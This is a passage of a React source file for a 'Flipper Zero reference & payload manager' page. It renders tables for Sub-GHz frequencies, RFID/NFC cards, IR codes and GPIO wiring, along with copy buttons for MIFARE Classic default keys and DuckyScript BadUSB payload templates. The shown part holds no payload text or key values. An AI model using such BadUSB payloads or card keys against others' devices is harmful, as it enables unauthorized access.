        lineHeight: 1.7, overflowX: 'auto', whiteSpace: 'pre-wrap', wordBreak: 'break-all',
      }}>
        {code}
      </pre>
      {!label && (
        <div style={{ position: 'absolute', top: 8, right: 8 }}>
          <CopyButton text={code} />
        </div>
      )}
    </div>
  );
}

function Table({ headers, rows, columnStyles = [] }) {
  return (
    <div style={{ overflowX: 'auto', borderRadius: 8, border: '1px solid rgba(255,255,255,0.04)' }}>
      <table style={{ width: '100%', borderCollapse: 'collapse', fontFamily: mono, fontSize: 11 }}>
        <thead>
          <tr style={{ background: '#0B0F18', position: 'sticky', top: 0, zIndex: 1 }}>
            {headers.map((h, i) => (
              <th key={i} style={{
                padding: '10px 14px', textAlign: 'left', fontWeight: 600, color: '#9CA3AF',
                borderBottom: '1px solid rgba(255,255,255,0.06)', whiteSpace: 'nowrap',
                fontSize: 10, textTransform: 'uppercase', letterSpacing: '0.05em',
                ...(columnStyles[i] || {}),
              }}>{h}</th>
            ))}
          </tr>
        </thead>
        <tbody>
          {rows.map((row, ri) => (
            <tr key={ri} style={{ background: ri % 2 === 0 ? '#0F1520' : '#0B1018' }}>
              {row.map((cell, ci) => (
                <td key={ci} style={{
                  padding: '9px 14px', color: '#D1D5DB', borderBottom: '1px solid rgba(255,255,255,0.02)',
                  lineHeight: 1.5, ...(columnStyles[ci] || {}),
                }}>{cell}</td>
              ))}
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

function Badge({ children, color }) {
  return (
    <span style={{
      display: 'inline-block', padding: '2px 8px', borderRadius: 4,
      fontFamily: mono, fontSize: 10, fontWeight: 600,
      background: `${color}18`, color, letterSpacing: '0.02em',
    }}>
      {children}
    </span>
  );
}

function SectionTitle({ children, icon: Icon }) {
  return (
    <div style={{
      display: 'flex', alignItems: 'center', gap: 8, marginTop: 20, marginBottom: 12,
      fontFamily: heading, fontSize: 14, fontWeight: 700, color: '#E2E8F0',
    }}>
      {Icon && <Icon size={15} style={{ color: '#6EE7B7' }} />}
      {children}
    </div>
  );
}

// ═══════════════════════════════════════════════════════
//  TAB CONTENT
// ═══════════════════════════════════════════════════════

function SubGhzTab({ search }) {
  const q = search.toLowerCase();

  const filteredFreqs = FREQUENCIES.filter(f =>
    !q || f.freq.toLowerCase().includes(q) || f.uses.toLowerCase().includes(q) || f.regions.some(r => r.toLowerCase().includes(q))
  );
  const filteredProtos = SUBGHZ_PROTOCOLS.filter(p =>
    !q || p.name.toLowerCase().includes(q) || p.desc.toLowerCase().includes(q)
  );

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
      <SectionTitle icon={Radio}>Common Frequencies</SectionTitle>
      <Table
        headers={['Frequency', 'Region', 'Common Uses']}
        columnStyles={[{ width: 130 }, { width: 160 }, {}]}
        rows={filteredFreqs.map(f => [
          <span style={{ fontWeight: 600, color: '#FBBF24' }}>{f.freq}</span>,
          <div style={{ display: 'flex', gap: 4, flexWrap: 'wrap' }}>
            {f.regions.map(r => <Badge key={r} color={REGION_COLORS[r]}>{r}</Badge>)}
          </div>,
          f.uses,
        ])}
      />

      <SectionTitle icon={Zap}>Protocol Reference</SectionTitle>
      <Table
        headers={['Protocol', 'Bits', 'Description']}
        columnStyles={[{ width: 140, fontWeight: 600 }, { width: 60, textAlign: 'center' }, {}]}
        rows={filteredProtos.map(p => [
          <span style={{ color: '#6EE7B7' }}>{p.name}</span>,
          <span style={{ color: '#FBBF24' }}>{p.bits}</span>,
          p.desc,
        ])}
      />

      <SectionTitle icon={Key}>.sub File Format Reference</SectionTitle>
      <Table
        headers={['Field', 'Description']}
        columnStyles={[{ width: 120, fontWeight: 600, color: '#A78BFA' }, {}]}
        rows={SUB_FILE_FIELDS.map(f => [f.field, f.desc])}
      />

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 12 }}>
        <CodeBlock code={SUB_RAW_EXAMPLE} label="RAW Signal File Example" />
        <CodeBlock code={SUB_KEY_EXAMPLE} label="Decoded Key File Example" />
      </div>
    </div>
  );
}

function RfidTab({ search }) {
  const q = search.toLowerCase();

  const filtered125 = RFID_125.filter(c =>
    !q || c.type.toLowerCase().includes(q) || c.notes.toLowerCase().includes(q) || c.format.toLowerCase().includes(q)
  );
  const filteredNfc = RFID_NFC.filter(c =>
    !q || c.type.toLowerCase().includes(q) || c.notes.toLowerCase().includes(q) || c.security.toLowerCase().includes(q)
  );

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
      <SectionTitle icon={CreditCard}>125 kHz (Low Frequency)</SectionTitle>
      <Table
        headers={['Card Type', 'ID Format', 'R/W', 'Notes']}
        columnStyles={[{ width: 110, fontWeight: 600 }, { width: 240 }, { width: 80, textAlign: 'center' }, {}]}
        rows={filtered125.map(c => [
          <span style={{ color: '#FBBF24' }}>{c.type}</span>,
          <span style={{ fontSize: 10, color: '#9CA3AF' }}>{c.format}</span>,
          <Badge color={c.rw === 'Read/Write' ? '#6EE7B7' : '#6B7280'}>{c.rw}</Badge>,
          c.notes,
        ])}
      />

      <SectionTitle icon={Wifi}>13.56 MHz (NFC / High Frequency)</SectionTitle>
      <Table
        headers={['Card Type', 'Memory', 'Sectors/Pages', 'Security', 'Notes']}
        columnStyles={[{ width: 160, fontWeight: 600 }, { width: 90 }, { width: 200 }, { width: 200 }, {}]}
        rows={filteredNfc.map(c => [
          <span style={{ color: '#7DD3FC' }}>{c.type}</span>,
          <span style={{ color: '#FBBF24' }}>{c.memory}</span>,
          <span style={{ fontSize: 10 }}>{c.sectors}</span>,
          <span style={{ fontSize: 10, color: c.security.includes('broken') || c.security === 'None (no authentication)' ? '#FB7185' : '#6EE7B7' }}>{c.security}</span>,
          c.notes,
        ])}
      />

      <SectionTitle icon={Lock}>MIFARE Classic Default Keys</SectionTitle>
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(340px, 1fr))', gap: 8 }}>
        {MIFARE_KEYS.filter(k => !q || k.key.toLowerCase().includes(q) || k.desc.toLowerCase().includes(q)).map((k, i) => (
          <Card key={i} style={{ padding: '10px 14px', display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 10 }}>
            <div style={{ display: 'flex', flexDirection: 'column', gap: 3 }}>
              <code style={{ fontFamily: mono, fontSize: 13, fontWeight: 700, color: '#FBBF24', letterSpacing: '0.08em' }}>{k.key}</code>
              <span style={{ fontFamily: mono, fontSize: 10, color: '#6B7280' }}>{k.desc}</span>
            </div>
            <CopyButton text={k.key} />
          </Card>
        ))}
      </div>
    </div>
  );
}

function IrTab({ search }) {
  const q = search.toLowerCase();

  const filteredProtos = IR_PROTOCOLS.filter(p =>
    !q || p.name.toLowerCase().includes(q) || p.notes.toLowerCase().includes(q)
  );

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
      <SectionTitle icon={Tv}>IR Protocol Reference</SectionTitle>
      <Table
        headers={['Protocol', 'Carrier', 'Encoding', 'Bits', 'Timing', 'Notes']}
        columnStyles={[
          { width: 100, fontWeight: 600 },
          { width: 80, textAlign: 'center' },
          { width: 100 },
          { width: 60, textAlign: 'center' },
          { width: 240, fontSize: 10 },
          {},
        ]}
        rows={filteredProtos.map(p => [
          <span style={{ color: '#FB7185' }}>{p.name}</span>,
          <span style={{ color: '#FBBF24' }}>{p.carrier}</span>,
          p.encoding,
          <span style={{ color: '#6EE7B7' }}>{p.bits}</span>,
          p.timing,
          p.notes,
        ])}
      />

      <SectionTitle icon={Zap}>Universal Remote Codes (NEC)</SectionTitle>
      <Table
        headers={['Action', 'Protocol', 'Address', 'Command', 'Hex', 'Notes']}
        columnStyles={[
          { width: 130, fontWeight: 600 },
          { width: 80 },
          { width: 80, textAlign: 'center' },
          { width: 80, textAlign: 'center' },
          { width: 120 },
          {},
        ]}
        rows={IR_UNIVERSAL.map(u => [
          u.action,
          <Badge color="#FB7185">{u.protocol}</Badge>,
          <code style={{ fontFamily: mono, color: '#FBBF24' }}>0x{u.address}</code>,
          <code style={{ fontFamily: mono, color: '#6EE7B7' }}>0x{u.command}</code>,
          <div style={{ display: 'flex', alignItems: 'center', gap: 4 }}>
            <code style={{ fontFamily: mono, fontSize: 10 }}>{u.hex}</code>
            <CopyButton text={u.hex} />
          </div>,
          <span style={{ fontSize: 10 }}>{u.notes}</span>,
        ])}
      />

      <SectionTitle icon={Key}>.ir File Format Reference</SectionTitle>
      <CodeBlock code={IR_FILE_EXAMPLE} label="Flipper IR Remote File (.ir)" />
    </div>
  );
}

function BadUsbTab({ search }) {
  const q = search.toLowerCase();

  const filteredCmds = DUCKY_COMMANDS.filter(c =>
    !q || c.cmd.toLowerCase().includes(q) || c.desc.toLowerCase().includes(q)
  );
  const filteredPayloads = DUCKY_PAYLOADS.filter(p =>
    !q || p.name.toLowerCase().includes(q) || p.desc.toLowerCase().includes(q) || p.payload.toLowerCase().includes(q)
  );

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
      <SectionTitle icon={ShieldAlert}>DuckyScript Command Reference</SectionTitle>
      <Table
        headers={['Command', 'Arguments', 'Description']}
        columnStyles={[{ width: 180, fontWeight: 600, color: '#6EE7B7' }, { width: 120, color: '#9CA3AF', fontStyle: 'italic' }, {}]}
        rows={filteredCmds.map(c => [c.cmd, c.args, c.desc])}
      />

      <SectionTitle icon={Usb}>Payload Templates</SectionTitle>
      <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
        {filteredPayloads.map((p, i) => (
          <Card key={i} style={{ padding: 0, overflow: 'hidden' }}>
            <div style={{
              padding: '12px 16px', display: 'flex', alignItems: 'center', justifyContent: 'space-between',
              borderBottom: '1px solid rgba(255,255,255,0.04)',
            }}>
              <div>
                <div style={{ fontFamily: heading, fontSize: 13, fontWeight: 700, color: '#E2E8F0' }}>{p.name}</div>
                <div style={{ fontFamily: mono, fontSize: 10, color: '#6B7280', marginTop: 2 }}>{p.desc}</div>
              </div>
              <CopyButton text={p.payload} />
            </div>
            <pre style={{
              margin: 0, padding: 14, background: '#0B0F18', fontFamily: mono, fontSize: 11,
              color: '#E2E8F0', lineHeight: 1.7, overflowX: 'auto', whiteSpace: 'pre-wrap',
            }}>
              {p.payload}
            </pre>
          </Card>
        ))}
      </div>
    </div>
  );
}

function GpioTab({ search }) {
  const q = search.toLowerCase();

  const filteredPins = GPIO_PINS.filter(p =>
    !q || p.label.toLowerCase().includes(q) || p.func.toLowerCase().includes(q) || p.notes.toLowerCase().includes(q)
  );

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
      <SectionTitle icon={Cpu}>GPIO Pinout</SectionTitle>
      <div style={{
        display: 'flex', flexWrap: 'wrap', gap: 6, padding: '12px 0',
      }}>
        {Object.entries(PIN_COLORS).map(([type, color]) => (
          <Badge key={type} color={color}>{type.toUpperCase()}</Badge>
        ))}
      </div>
      <Table
        headers={['Pin', 'Label', 'Function', 'Type', 'Notes']}
        columnStyles={[
          { width: 50, textAlign: 'center' },
          { width: 60, fontWeight: 700, textAlign: 'center' },
          { width: 220 },
          { width: 80, textAlign: 'center' },
          {},
        ]}
        rows={filteredPins.map(p => [
          <span style={{ color: '#6B7280' }}>{p.pin}</span>,
          <span style={{ color: PIN_COLORS[p.type] || '#6EE7B7' }}>{p.label}</span>,
          p.func,
          <Badge color={PIN_COLORS[p.type] || '#6EE7B7'}>{p.type}</Badge>,
          <span style={{ fontSize: 10 }}>{p.notes}</span>,
        ])}
      />

      <SectionTitle icon={Cable}>UART Connection Guide</SectionTitle>
      <Card>
        <div style={{ fontFamily: mono, fontSize: 11, color: '#D1D5DB', lineHeight: 2 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
            <span style={{ color: '#3B82F6', fontWeight: 600 }}>Flipper TX (pin 3)</span>
            <ChevronRight size={12} style={{ color: '#4B5563' }} />
            <span style={{ color: '#6EE7B7' }}>Target RX</span>
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
            <span style={{ color: '#3B82F6', fontWeight: 600 }}>Flipper RX (pin 4)</span>
            <ChevronRight size={12} style={{ color: '#4B5563' }} />
            <span style={{ color: '#6EE7B7' }}>Target TX</span>
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
            <span style={{ color: '#EF4444', fontWeight: 600 }}>Flipper GND (pin 8)</span>
            <ChevronRight size={12} style={{ color: '#4B5563' }} />
            <span style={{ color: '#6EE7B7' }}>Target GND</span>
          </div>
          <div style={{ marginTop: 8, fontSize: 10, color: '#6B7280' }}>
            ⚠ Always connect GND first. Flipper UART is 3.3V logic — use a level shifter for 5V targets.
          </div>
        </div>
      </Card>

      <SectionTitle icon={Wifi}>Module Wiring Guides</SectionTitle>
      <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
        {GPIO_MODULES.filter(m => !q || m.name.toLowerCase().includes(q) || m.desc.toLowerCase().includes(q)).map((m, i) => (
          <Card key={i} style={{ padding: 0, overflow: 'hidden' }}>
            <div style={{
              padding: '12px 16px', borderBottom: '1px solid rgba(255,255,255,0.04)',
            }}>
              <div style={{ fontFamily: heading, fontSize: 13, fontWeight: 700, color: '#E2E8F0' }}>{m.name}</div>
              <div style={{ fontFamily: mono, fontSize: 10, color: '#6B7280', marginTop: 3 }}>{m.desc}</div>
            </div>
            <div style={{ padding: '0 4px' }}>
              <Table
                headers={['Flipper Pin', 'Module Pin', 'Wire']}
                columnStyles={[{ fontWeight: 600 }, { fontWeight: 600 }, { width: 80, textAlign: 'center' }]}
                rows={m.connections.map(c => [
                  <span style={{ color: '#7DD3FC' }}>{c.flipper}</span>,
                  <span style={{ color: '#6EE7B7' }}>{c.module}</span>,
                  <span style={{
                    display: 'inline-flex', alignItems: 'center', gap: 5,
                  }}>
                    <span style={{
                      display: 'inline-block', width: 10, height: 10, borderRadius: '50%',
                      background: c.wire, border: c.wire === 'black' ? '1px solid #4B5563' : 'none',
                    }} />
                    {c.wire}
                  </span>,
                ])}
              />
            </div>
          </Card>
        ))}
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════
//  MAIN PAGE
// ═══════════════════════════════════════════════════════

export default function Flipper() {
  const [tab, setTab] = useState('subghz');
  const [search, setSearch] = useState('');

  const tabContent = useMemo(() => {
    switch (tab) {
      case 'subghz': return <SubGhzTab search={search} />;
      case 'rfid': return <RfidTab search={search} />;
      case 'ir': return <IrTab search={search} />;
      case 'badusb': return <BadUsbTab search={search} />;
      case 'gpio': return <GpioTab search={search} />;
      default: return null;
    }
  }, [tab, search]);

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 16, height: 'calc(100vh - 120px)' }}>
      {/* Header */}
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
          <div style={{
            width: 36, height: 36, borderRadius: 10,
            background: 'rgba(251,191,36,0.1)', border: '1px solid rgba(251,191,36,0.2)',
            display: 'flex', alignItems: 'center', justifyContent: 'center',
          }}>
            <Radio size={18} style={{ color: '#FBBF24' }} />
          </div>
          <div>
            <h1 style={{
              fontFamily: heading, fontSize: 20, fontWeight: 800, color: '#E2E8F0',
              margin: 0, letterSpacing: '-0.02em',
            }}>
              Flipper Zero
            </h1>
            <span style={{ fontFamily: mono, fontSize: 10, color: '#4B5563' }}>
              reference & payload manager
            </span>
          </div>
          <ToolHelp title="Flipper Zero" description="Flipper Zero reference guide covering Sub-GHz, RFID/NFC, infrared, BadUSB, GPIO, and firmware." steps={["Select a tab for the Flipper module you need","Browse frequency tables, protocol specs, and file formats","Copy DuckyScript payloads from the BadUSB tab","Reference GPIO pinouts and module connections"]} tips={["Sub-GHz tab has frequency bands and .sub file format","RFID tab includes MIFARE default keys","BadUSB payloads are in DuckyScript format"]} />
        </div>

        {/* Search */}
        <div style={{
          display: 'flex', alignItems: 'center', gap: 8,
          background: '#11151E', border: '1px solid rgba(255,255,255,0.04)',
          borderRadius: 8, padding: '6px 12px', width: 280,
        }}>
          <Search size={13} style={{ color: '#4B5563', flexShrink: 0 }} />
          <input
            value={search}
            onChange={e => setSearch(e.target.value)}
            placeholder="Search..."
            style={{
              background: 'transparent', border: 'none', outline: 'none', width: '100%',
              fontFamily: mono, fontSize: 11, color: '#E2E8F0',
            }}
          />
          {search && (
            <button
              onClick={() => setSearch('')}
              style={{
                background: 'none', border: 'none', cursor: 'pointer',
                fontFamily: mono, fontSize: 10, color: '#4B5563', padding: '2px 4px',
              }}
            >
              ✕
            </button>
          )}
        </div>
      </div>

      {/* Tab Buttons */}
      <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
        {TABS.map(t => {
          const active = tab === t.key;
          const Icon = t.icon;
          return (
            <button
              key={t.key}
              onClick={() => setTab(t.key)}
              style={{
                display: 'flex', alignItems: 'center', gap: 6,
                padding: '8px 16px', borderRadius: 8, cursor: 'pointer',
                fontFamily: mono, fontSize: 11, fontWeight: 500,
                background: active ? 'rgba(110,231,183,0.08)' : 'transparent',
                border: active ? '1px solid rgba(110,231,183,0.12)' : '1px solid transparent',
                color: active ? '#6EE7B7' : '#6B7280',
                transition: 'all 120ms ease',
              }}
            >
              <Icon size={13} />
              {t.label}
            </button>
          );
        })}
      </div>

      {/* Tab Content */}
      <div style={{ flex: 1, overflow: 'auto', paddingBottom: 40 }}>
        {tabContent}
      </div>
    </div>
  );
}
